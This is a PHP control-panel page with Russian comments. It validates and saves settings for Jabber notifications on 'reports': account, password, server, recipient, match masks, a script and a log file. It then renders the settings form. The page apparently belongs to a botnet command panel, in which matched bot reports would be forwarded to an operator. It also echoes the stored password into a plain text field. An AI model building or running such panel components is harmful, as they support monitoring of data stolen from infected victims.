<?php if(!defined('__CP__'))die();

define('INPUT_WIDTH', '600px');
$errors = array();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обработка данных.
///////////////////////////////////////////////////////////////////////////////////////////////////

$is_post     = strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0 ? true : false;

$jn_enabled  = (isset($_POST['enable']) && $_POST['enable'] == 1) ? 1 : ($is_post ? 0 : $config['reports_jn']);
$jn_password = isset($_POST['password']) ? $_POST['password'] : $config['reports_jn_pass'];

//Проверяем отправителя.
if(!isset($_POST['account']))
{
  $jn_account = $config['reports_jn_account'];
  $jn_server  = $config['reports_jn_server'];
  $jn_port    = $config['reports_jn_port'];
}
else
{
  $jn_account = '';
  $jn_server  = '';
  $jn_port    = 5222;

  //Получаем все компоненты акканута.
  $m = explode('@', $_POST['account']);
  if(count($m) != 2 || strlen($m[0]) < 1 || strlen($m[1]) < 1)$errors[] = LNG_REPORTS_E1;
  else
  {
    $jn_account = trim($m[0]);
    $jn_server  = trim($m[1]);
    
    $pm = explode(':', $jn_server);
    if(count($pm) > 1)
    {
      $pm[1] = trim($pm[1]);
      if(count($pm) != 2 || !is_numeric($pm[1]) || $pm[1] < 1 || $pm[1] > 0xFFFF)$errors[] = LNG_REPORTS_E1;
      else
      {
        $jn_port   = $pm[1];
        $jn_server = trim($pm[0]);
      }
    }
  }
}

//Проверяем получателя.
if(isset($_POST['to']))
{
  if(count(($m = explode('@', $_POST['to']))) != 2 || strlen($m[0]) < 1 || strlen($m[1]) < 1)$errors[] = LNG_REPORTS_E2;
  $jn_to = $_POST['to'];
}
else $jn_to = $config['reports_jn_to'];;

//Обрабатываем маски.
$jn_masks = isset($_POST['masks']) ? $_POST['masks'] : str_replace("\x01", "\n", $config['reports_jn_list']);
$jn_masks = trim(str_replace("\r\n", "\n", $jn_masks));

//Проверяем скрипт.
$jn_script = trim(isset($_POST['script']) ? $_POST['script'] : $config['reports_jn_script']);

//Проверяем лог-файл.
$jn_logfile = trim(str_replace('\\', '/', trim(isset($_POST['logfile']) ? $_POST['logfile'] : $config['reports_jn_logfile'])), '/');

//Сохранение параметров.
if($is_post && count($errors) == 0)
{
  $updateList['reports_jn']         = $jn_enabled ? 1 : 0; 
  $updateList['reports_jn_account'] = $jn_account;
  $updateList['reports_jn_pass']    = $jn_password;
  $updateList['reports_jn_server']  = $jn_server;
  $updateList['reports_jn_port']    = $jn_port;
  $updateList['reports_jn_to']      = $jn_to;
  $updateList['reports_jn_list']    = str_replace("\n", "\x01", $jn_masks);
  $updateList['reports_jn_script']  = $jn_script;
  $updateList['reports_jn_logfile'] = $jn_logfile;
  
  if(!updateConfig($updateList))$errors[] = LNG_REPORTS_E3;
  else
  {
    header('Location: '.QUERY_STRING.'&u=1');
    die();
  }
}

///////////////////////////////////////////////////////////////////////////////////////////////////
// Вывод.
///////////////////////////////////////////////////////////////////////////////////////////////////

ThemeBegin(LNG_REPORTS, 0, 0, 0);

//Вывод ошибок.
if(count($errors) > 0)
{
  echo THEME_STRING_FORM_ERROR_1_BEGIN;
  foreach($errors as $r)echo $r.THEME_STRING_NEWLINE;
  echo THEME_STRING_FORM_ERROR_1_END;
}
//Вывод сообщений.
else if(isset($_GET['u']))
{
  echo THEME_STRING_FORM_SUCCESS_1_BEGIN.LNG_REPORTS_UPDATED.THEME_STRING_NEWLINE.THEME_STRING_FORM_SUCCESS_1_END;
}

//Вывод формы.
echo
str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN),
str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
  THEME_DIALOG_ROW_BEGIN.
    str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_GROUP_BEGIN).
      str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_REPORTS_OPTIONS), THEME_DIALOG_TITLE).
      THEME_DIALOG_ROW_BEGIN.
        str_replace(array('{COLUMNS_COUNT}', '{NAME}', '{VALUE}', '{JS_EVENTS}', '{TEXT}'), array(2, 'enable', 1, '', LNG_REPORTS_OPTIONS_ENABLE), $jn_enabled ? THEME_DIALOG_ITEM_INPUT_CHECKBOX_ON_2 : THEME_DIALOG_ITEM_INPUT_CHECKBOX_2).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_ACCOUNT, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('account', htmlEntitiesEx($jn_account.'@'.$jn_server.($jn_port == 5222 ? '' : ':'.$jn_port)), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_PASSWORD, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('password', htmlEntitiesEx($jn_password), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_TO, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('to', htmlEntitiesEx($jn_to), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_MASKS, THEME_DIALOG_ITEM_TEXT_TOP).
        str_replace(array('{NAME}', '{ROWS}', '{COLS}', '{WIDTH}', '{TEXT}'), array('masks', 20, 100, INPUT_WIDTH, htmlEntitiesEx($jn_masks)), THEME_DIALOG_ITEM_INPUT_TEXTAREA).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_SCRIPT, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('script', htmlEntitiesEx($jn_script), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
      THEME_DIALOG_ROW_BEGIN.
        str_replace('{TEXT}', LNG_REPORTS_OPTIONS_LOGFILE, THEME_DIALOG_ITEM_TEXT).
        str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('logfile', htmlEntitiesEx($jn_logfile), 255, INPUT_WIDTH), THEME_DIALOG_ITEM_INPUT_TEXT).
      THEME_DIALOG_ROW_END.
    THEME_DIALOG_GROUP_END.
  THEME_DIALOG_ROW_END.
  str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN).
    str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_REPORTS_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT).
  THEME_DIALOG_ACTIONLIST_END.
THEME_DIALOG_END.
THEME_FORMPOST_END;

ThemeEnd();
?>